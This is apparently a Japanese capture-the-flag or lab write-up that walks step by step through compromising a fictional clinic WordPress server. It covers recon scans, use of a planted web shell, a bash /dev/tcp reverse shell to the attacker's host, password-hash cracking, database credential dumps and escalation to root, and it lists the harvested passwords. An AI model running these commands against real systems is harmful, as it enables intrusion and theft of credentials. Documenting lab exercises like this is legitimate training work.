# 第1ラウンド 攻略経路 詳細

## Phase 1: 偵察（Reconnaissance）

### 1. ポート・スキャン
```
nmap -sV -sC 10.0.1.20
```
→ 5ポート発見：FTP(21), SSH(22), HTTP(80), HTTPS(443), MySQL(3306)

### 2. robots.txt確認
```
curl -s http://10.0.1.20/robots.txt
```
→ 4つのDisallow: `/igmc/wp-admin/`, `/igmc/wp-includes/`, `/backup/`, `/old/`
→ コメントにyamadaというユーザー名とFTPの情報が漏洩

### 3. /backup/ と /old/ をgobusterで探索
```
gobuster dir -u http://10.0.1.20/backup/ -w /usr/share/wordlists/dirb/common.txt -x txt,zip,sql,bak --exclude-length 0
gobuster dir -u http://10.0.1.20/old/ -w /usr/share/wordlists/dirb/common.txt -x txt,zip,sql,bak -t 5 --exclude-length 0
```
→ 空振り。何も見つからなかった

### 4. HTTPS(443)側を確認
```
curl -sk https://10.0.1.20/
curl -sk https://10.0.1.20/backup/
curl -sk https://10.0.1.20/old/
```
→ ディレクトリ・リスティングは有効だが中身なし。空振り

---

## Phase 2: ワードプレス偵察

### 5. /igmc/ にワードプレス発見
```
curl -s http://10.0.1.20/igmc/ | head -30
```
→ IronGuard Medical Clinic、WordPress 6.4.3

### 6. ユーザー列挙を試みた
```
curl -s http://10.0.1.20/igmc/wp-json/wp/v2/users
curl -s -o /dev/null -w "%{http_code} %{redirect_url}" http://10.0.1.20/igmc/?author=1
```
→ API無効、CloudSecureWPプラグインにブロックされた。失敗

### 7. wpscan実行
```
wpscan --url http://10.0.1.20/igmc/ --enumerate u,p,t
```
→ XML-RPC有効、アップロード・ディレクトリのリスティング有効を発見
→ ユーザー列挙は失敗

---

## Phase 3: 突破口（ウェブシェル発見）

### 8. アップロード・ディレクトリ探索
```
curl -s http://10.0.1.20/igmc/wp-content/uploads/
```
→ `2026/`, `ao_ccss/`, `snet-monitor/`, `wpcode/` を発見

### 9. snet-monitor内にshell.php発見
```
curl -s http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/
```
→ shell.php（31バイト）

### 10. ウェブシェルでRCE確認
```
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=id"
```
→ uid=1002(webuser) — 初めてのコマンド実行成功

---

## Phase 4: 内部偵察（webuser権限）

### 11. ユーザー確認
```
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=ls+-la+/home/"
```
→ rocky, support, webuser の3ユーザー

### 12. user.txt取得
```
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=cat+/home/webuser/user.txt"
```
→ FLAG{wordpress_plugins_need_updates}

### 13. FTPパスワードハッシュ取得
```
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=cat+/home/webuser/ftpd.passwd"
```
→ yamadaのMD5cryptハッシュ: $1$IIjfcI3K$K02rrx8OufI9v0kC2pSAP1

### 14. johnでクラック試行
```
echo '$1$IIjfcI3K$K02rrx8OufI9v0kC2pSAP1' > /tmp/ftphash.txt
john /tmp/ftphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
→ 失敗。rockyou.txtでは割れなかった ← 詰まりポイント1

---

## Phase 5: wp-config.phpからDBへ

### 15. wp-config.php探索
```
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=cat+/var/www/html/igmc/wp-config.php"
```
→ 空。パスが違った ← 詰まりポイント2

```
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=find+/+-name+wp-config.php+2>/dev/null"
```
→ /home/webuser/public_html/igmc/wp-config.php と /home/webuser/test_site/wp-config.php を発見

### 16. wp-config.php読み取り
```
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=cat+/home/webuser/public_html/igmc/wp-config.php"
```
→ DBクレデンシャル: clinicwp / medicine1 / clinicwpdb
→ テーブルプレフィックス: wp21c261
→ 認証キーが全部デフォルト（put your unique phrase here）

### 17. パスワード・リユース試行
```
ssh rocky@10.0.1.20    # medicine1 → 失敗
ssh support@10.0.1.20  # medicine1 → 失敗
```
→ 全ユーザー全滅 ← 詰まりポイント3

---

## Phase 6: リバース・シェル

### 18. ncでリスナー立ててリバース・シェル取得
```
# Kali側
nc -lvnp 4444

# 別ペインで
curl -s "http://10.0.1.20/igmc/wp-content/uploads/snet-monitor/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.1.10/4444+0>%261'"
```
→ webuserの対話的シェル取得

### 19. シェルアップグレード
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 50 cols 200
```

### 20. リバース・シェルで内部偵察
```
sudo -l              → パスワード必要で使えない
find / -perm -4000   → 標準的なSUIDのみ
cat /etc/crontab     → 空
cat /etc/ssh/sshd_config → 権限なしで読めない
```
→ 全部ダメ ← 詰まりポイント4（一番長く詰まった）

### 21. Apache設定ファイル調査
```
ls -la /etc/httpd/conf.d/
cat /etc/httpd/conf.d/ironguard.conf
cat /etc/httpd/conf.d/test-ironguard.conf
cat /etc/httpd/conf.d/security.conf
cat /etc/httpd/conf.d/status.conf
```
→ server-status/server-info が Require all granted（全公開）
→ test.ironguard-clinic.local のバーチャルホスト存在

### 22. FTP転送ログ確認
```
rce zcat /var/log/xferlog-20260329.gz
```
→ supportユーザーがFTP経由で.ssh/authorized_keysをアップロードしていた痕跡
→ yamadaがFTPでテスト用PHPファイルをアップロードしていた痕跡

### 23. ProFTPD設定確認
```
cat /etc/pam.d/proftpd
```
→ PAMのpassword-auth使用（= Linuxシステムパスワードと同一）
→ /etc/proftpd.conf は root:root で読めず

### 24. グループ確認
```
rce cat /etc/group | grep -E "rocky|support|wheel|sudo"
```
→ rockyがwheelグループ（= sudo可能）

---

## Phase 7: DB深掘り → 決定打

### 25. MariaDBに外部接続
```
mysql -h 10.0.1.20 -u clinicwp -pmedicine1 --skip-ssl clinicwpdb -e "SELECT user_login, user_pass, user_email FROM wp21c261users;"
```
→ SSLエラー → --skip-ssl で解決
→ clinic_admin と yamada のphpassハッシュ取得

### 26. clinic_adminのハッシュをjohnでクラック
```
echo 'clinic_admin:$P$BSmQyV2s3A3CmkdwRUt12kQYOeMmK40' > /tmp/wphash.txt
echo 'yamada:$P$BVIZMKqOczuAvmEVDl17O044ZAouKq0' >> /tmp/wphash.txt
john /tmp/wphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
→ clinic_admin : medicare で成功
→ yamada は未クラック

### 27. WP管理パネルにログイン成功
```
curl -s -c /tmp/cookies.txt -X POST "http://10.0.1.20/igmc/wp-login.php" -d "log=clinic_admin&pwd=medicare&wp-submit=Log+In&redirect_to=http://10.0.1.20/igmc/wp-admin/"
```
→ ダッシュボード表示確認（ただしこの経路は直接rootには使わなかった）

### 28. プラグイン一覧確認
```
rce ls /home/webuser/public_html/igmc/wp-content/plugins/
```
→ 24個のプラグイン発見（snet-security-monitor, wpvivid-backuprestore, insert-headers-and-footers等）

### 29. テーブル一覧確認 → カスタムテーブル発見
```
mysql -u clinicwp -pmedicine1 --skip-ssl clinicwpdb -e "SHOW TABLES;"
```
→ wp21c261_system_accounts — 標準WPテーブルではないカスタムテーブル

### 30. system_accountsの中身 → 平文パスワード！
```
mysql -u clinicwp -pmedicine1 --skip-ssl clinicwpdb -e "SELECT * FROM wp21c261_system_accounts;"
```
→ support : Welc0me2024! （平文！）
→ rocky : [redacted]

---

## Phase 8: root取得

### 31. SSHでsupportログイン
```
ssh support@10.0.1.20
```
→ パスワード: Welc0me2024! → 成功

### 32. sudo権限確認
```
sudo -l
```
→ (ALL : ALL) ALL — 全コマンド実行可能

### 33. root奪取
```
sudo su -
```
→ root取得、root.txt確認

---

## 詰まったポイントまとめ

1. **yamadaのFTPハッシュ** — rockyou.txtで割れず。日本語辞書も検討したが断念
2. **wp-config.phpのパス** — /var/www/html/ にあると思い込んで空振り。findで解決
3. **パスワード・リユース** — medicine1/medicareで全ユーザーSSH試行したが全滅
4. **リバース・シェルでの権限昇格** — sudo、SUID、cron全部ダメ。ここが一番長かった
5. **リバース・シェルのUI** — 画面表示の制限、コピペの困難さ

---

## 取得クレデンシャル一覧

| ユーザー | パスワード | 取得元 | 用途 |
|----------|-----------|--------|------|
| clinicwp | medicine1 | wp-config.php | DB接続 |
| clinic_admin | medicare | john crack (phpass) | WP管理パネル |
| support | Welc0me2024! | DB system_accounts (平文) | SSH + sudo |
| yamada | 未クラック | ftpd.passwd (MD5crypt) | FTP |
| rocky | [redacted] | DB system_accounts | 不明 |

## 使用ツール一覧

- nmap (ポートスキャン)
- gobuster (ディレクトリ探索)
- wpscan (WordPress脆弱性スキャン)
- curl (HTTP手動リクエスト)
- john (パスワードクラック)
- nc/netcat (リバース・シェル)
- mysql (DB接続)
- hydra (SSHブルート・フォース — 走らせたが結果出る前に別経路で解決)
